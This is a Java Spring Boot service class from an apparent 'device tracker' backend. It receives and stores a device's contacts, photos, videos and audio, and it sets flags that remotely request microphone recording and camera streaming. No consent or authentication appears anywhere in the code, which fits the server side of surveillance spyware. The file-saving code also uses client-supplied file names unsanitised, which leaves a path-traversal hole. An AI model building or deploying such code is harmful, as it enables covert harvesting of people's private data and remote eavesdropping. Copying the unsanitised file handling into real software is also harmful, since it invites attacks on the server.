package com.manish.device_tracker_api.service;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.multipart.MultipartFile;
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.UUID;
import com.manish.device_tracker_api.dto.ContactItem;
import com.manish.device_tracker_api.dto.ContactPayload;
import com.manish.device_tracker_api.dto.ContactResponse;
import com.manish.device_tracker_api.dto.ImageResponse;
import com.manish.device_tracker_api.dto.MicRequest;
import com.manish.device_tracker_api.entity.Audio;
import com.manish.device_tracker_api.entity.Contact;
import com.manish.device_tracker_api.entity.DeviceInfo;
import com.manish.device_tracker_api.entity.Image;
import com.manish.device_tracker_api.entity.Video;
import com.manish.device_tracker_api.repository.AudioRepo;
import com.manish.device_tracker_api.repository.ContactRepo;
import com.manish.device_tracker_api.repository.DeviceInfoRepository;
import com.manish.device_tracker_api.repository.ImageRepo;
import com.manish.device_tracker_api.repository.VideoRepo;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
public class MediaService {

    @Autowired
    private ContactRepo contactRepo;

    @Autowired
    private ImageRepo imageRepo;

    @Autowired
    private VideoRepo videoRepo;

    @Autowired
    private AudioRepo audioRepo;

    @Autowired
    private DeviceInfoRepository deviceInfoRepository;

    public void saveContact(ContactPayload request) {

        if (request == null
                || request.getContacts() == null
                || request.getContacts().isEmpty()) {
            return;
        }

        contactRepo.deleteByDeviceId(request.getDeviceId());

        List<Contact> contactList = new ArrayList<>();
        Set<String> uniqueNumbers = new HashSet<>();

        for (ContactItem item : request.getContacts()) {

            String phone = item.getPhoneNumber();

            // Duplicate number skip
            if (!uniqueNumbers.add(phone)) {
                continue;
            }

            Contact contact = new Contact();

            contact.setDeviceId(request.getDeviceId());
            contact.setContactName(item.getContactName());
            contact.setPhoneNumber(phone);
            contact.setCreatedAt(LocalDateTime.now());

            contactList.add(contact);
        }

        contactRepo.saveAll(contactList);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(request.getDeviceId())
                .orElseThrow(() -> new RuntimeException("Device not found"));

        device.setContactsUploaded(true);
        device.setRefreshContacts(false);

        deviceInfoRepository.save(device);
    }

    public List<ContactResponse> getContacts(String deviceId) {

        return contactRepo
                .findByDeviceIdOrderByContactNameAsc(deviceId)
                .stream()
                .map(contact -> ContactResponse.builder()
                        .id(contact.getId())
                        .contactName(contact.getContactName())
                        .phoneNumber(contact.getPhoneNumber())
                        .createdAt(contact.getCreatedAt())
                        .build())
                .toList();
    }

    public void refreshContacts(String deviceId) {

        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device not found"));

        device.setRefreshContacts(false);

        deviceInfoRepository.save(device);
    }

    public void deleteContacts(String deviceId) {

        contactRepo.deleteByDeviceId(deviceId);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setContactsUploaded(false);
        device.setRefreshContacts(true);

        deviceInfoRepository.save(device);
    }

    public void saveImages(
            String deviceId,
            List<MultipartFile> files) throws IOException {

        File folder = new File("uploads");

        if (!folder.exists()) {
            folder.mkdirs();
        }

        imageRepo.deleteByDeviceId(deviceId);

        List<Image> imageList = new ArrayList<>();

        for (MultipartFile file : files) {

            String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();

            Path path = Paths.get("uploads", fileName);

            Files.copy(
                    file.getInputStream(),
                    path,
                    StandardCopyOption.REPLACE_EXISTING);

            Image image = new Image();

            image.setDeviceId(deviceId);
            image.setImageName(file.getOriginalFilename());
            image.setImageUrl("/uploads/" + fileName);
            image.setImageSize(file.getSize());
            image.setCreatedAt(LocalDateTime.now());

            imageList.add(image);
        }

        imageRepo.saveAll(imageList);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device not found"));

        device.setImagesUploaded(true);
        device.setRefreshImages(false);

        deviceInfoRepository.save(device);
    }

    public List<ImageResponse> getImages(String deviceId) {

        return imageRepo
                .findByDeviceIdOrderByImageNameAsc(deviceId)
                .stream()
                .map(image -> ImageResponse.builder()
                        .id(image.getId())
                        .imageName(image.getImageName())
                        .imageUrl(image.getImageUrl())
                        .imageSize(image.getImageSize())
                        .createdAt(image.getCreatedAt())
                        .build())
                .toList();
    }

    public void refreshImages(String deviceId) {

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device not found"));

        device.setRefreshImages(true);

        deviceInfoRepository.save(device);
    }

    public void deleteImages(String deviceId) {

        List<Image> images = imageRepo.findByDeviceIdOrderByImageNameAsc(deviceId);

        for (Image image : images) {

            if (image.getImageUrl() != null) {

                String path = image.getImageUrl().replace("/uploads/", "");

                File file = new File("uploads", path);

                if (file.exists()) {

                    if (!file.delete()) {
                        System.out.println("Unable to delete : " + file.getAbsolutePath());
                    }
                }
            }
        }

        imageRepo.deleteByDeviceId(deviceId);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setImagesUploaded(false);
        device.setRefreshImages(true);

        deviceInfoRepository.save(device);
    }

    public void saveVideos(
            String deviceId,
            List<MultipartFile> files) throws IOException {

        File folder = new File("uploads/videos");

        if (!folder.exists()) {
            folder.mkdirs();
        }

        videoRepo.deleteByDeviceId(deviceId);

        List<Video> videoList = new ArrayList<>();

        for (MultipartFile file : files) {

            String fileName = UUID.randomUUID() + "_"
                    + file.getOriginalFilename();

            Path path = Paths.get(
                    "uploads/videos",
                    fileName);

            Files.copy(
                    file.getInputStream(),
                    path,
                    StandardCopyOption.REPLACE_EXISTING);

            Video video = new Video();

            video.setDeviceId(deviceId);
            video.setVideoName(file.getOriginalFilename());
            video.setVideoUrl("/uploads/videos/" + fileName);
            video.setVideoSize(file.getSize());
            video.setDuration(0L); // Android se duration bhejoge to update kar dena
            video.setCreatedAt(LocalDateTime.now());

            videoList.add(video);
        }

        videoRepo.saveAll(videoList);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setVideosUploaded(true);
        device.setRefreshVideos(false);

        deviceInfoRepository.save(device);
    }

    public void requestVideos(String deviceId) {

        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
                .orElseThrow(
                        () -> new RuntimeException("Device Not Found"));

        device.setRefreshVideos(true);

        device.setVideosUploaded(false);

        deviceInfoRepository.save(device);

    }

    public List<Video> getVideos(String deviceId) {

        return videoRepo
                .findByDeviceIdOrderByCreatedAtDesc(deviceId);
    }

    public void deleteVideos(String deviceId) {

        List<Video> videos = videoRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId);

        for (Video video : videos) {

            if (video.getVideoUrl() != null) {

                String fileName = video.getVideoUrl()
                        .replace("/uploads/videos/", "");

                File file = new File("uploads/videos", fileName);

                if (file.exists()) {
                    file.delete();
                }
            }
        }

        videoRepo.deleteByDeviceId(deviceId);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setVideosUploaded(false);
        device.setRefreshVideos(true);

        deviceInfoRepository.save(device);
    }

    public void saveAudios(
            String deviceId,
            List<MultipartFile> files) throws IOException {

        File folder = new File("uploads/audios");

        if (!folder.exists()) {
            folder.mkdirs();
        }

        audioRepo.deleteByDeviceId(deviceId);

        List<Audio> audioList = new ArrayList<>();

        for (MultipartFile file : files) {

            String fileName = UUID.randomUUID() + "_"
                    + file.getOriginalFilename();

            Path path = Paths.get(
                    "uploads/audios",
                    fileName);

            Files.copy(
                    file.getInputStream(),
                    path,
                    StandardCopyOption.REPLACE_EXISTING);

            Audio audio = new Audio();

            audio.setDeviceId(deviceId);
            audio.setAudioName(file.getOriginalFilename());
            audio.setAudioUrl("/uploads/audios/" + fileName);
            audio.setAudioSize(file.getSize());
            audio.setDuration(0L);
            audio.setCreatedAt(LocalDateTime.now());

            audioList.add(audio);

        }

        audioRepo.saveAll(audioList);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setAudiosUploaded(true);
        device.setRefreshAudios(false);

        deviceInfoRepository.save(device);

    }

    public List<Audio> getAudios(String deviceId) {

        return audioRepo
                .findByDeviceIdOrderByCreatedAtDesc(deviceId);

    }

    public void requestAudio(String deviceId) {

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(
                        () -> new RuntimeException("Device not found"));

        device.setRefreshAudios(true);

        device.setAudiosUploaded(false);

        deviceInfoRepository.save(device);

    }

    public void deleteAudios(String deviceId) {

        List<Audio> audios = audioRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId);

        for (Audio audio : audios) {

            if (audio.getAudioUrl() != null) {

                String fileName = audio.getAudioUrl()
                        .replace("/uploads/audios/", "");

                File file = new File("uploads/audios", fileName);

                if (file.exists()) {

                    file.delete();

                }

            }

        }

        audioRepo.deleteByDeviceId(deviceId);

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setAudiosUploaded(false);
        device.setRefreshAudios(true);

        deviceInfoRepository.save(device);

    }

    public void requestMic(MicRequest request) {

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(request.getDeviceId())
                .orElseThrow();

        device.setRefreshMic(true);

        device.setMicUploaded(false);

        device.setMicDuration(request.getDuration());

        deviceInfoRepository.save(device);

    }

    public void requestCamera(String deviceId) {

        log.info("deviceId {}", deviceId);

        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setRefreshCamera(true);

        device.setCameraStreaming(false);

        deviceInfoRepository.save(device);

    }

    public void cameraStopped(String deviceId) {

        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setCameraStreaming(false);

        device.setRefreshCamera(false);

        deviceInfoRepository.save(device);

    }

    public Boolean cameraStatus(String deviceId) {

        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        return device.getCameraStreaming();

    }

    public void cameraStarted(String deviceId) {

        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setCameraStreaming(true);

        device.setRefreshCamera(false);

        deviceInfoRepository.save(device);

    }

    public void cameraRequestReceived(String deviceId) {

        DeviceInfo device = deviceInfoRepository
                .findByDeviceId(deviceId)
                .orElseThrow(() -> new RuntimeException("Device Not Found"));

        device.setRefreshCamera(false);

        deviceInfoRepository.save(device);
    }

}
